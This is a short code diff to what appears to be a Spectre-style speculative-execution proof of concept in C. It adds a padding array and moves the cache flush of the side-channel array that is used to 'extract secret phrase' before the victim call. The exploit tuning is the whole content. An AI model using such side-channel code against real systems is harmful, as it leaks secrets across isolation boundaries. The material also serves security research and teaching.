@@ -12,6 +12,7 @@
 
 uint8_t channel[256 * GAP]; // side channel to extract secret phrase
 uint64_t *target; // pointer to indirect call target
+uint8_t unused[256 * GAP];
 uint8_t array_in1[256 * GAP];
 uint8_t array_in2[256 * GAP];
 
@@ -63,8 +64,6 @@ int readByte(uint8_t *addr1, uint8_t *addr2, int input)
     }
     _mm_mfence();
 
-    // flush side channel
-    _mm_clflush(&channel[mix_i * GAP]);
     // change to safe target
     *target = (uint64_t)&safe_target;
     _mm_mfence();
@@ -75,6 +74,8 @@ int readByte(uint8_t *addr1, uint8_t *addr2, int input)
     _mm_clflush(&array_in1[(input & 1) << 12]);
     _mm_clflush(&array_in2[(input & 2) << 11]);
     _mm_clflush((void*) target);
+    // flush side channel
+    _mm_clflush(&channel[mix_i * GAP]);
     _mm_mfence();
 
     // call victim
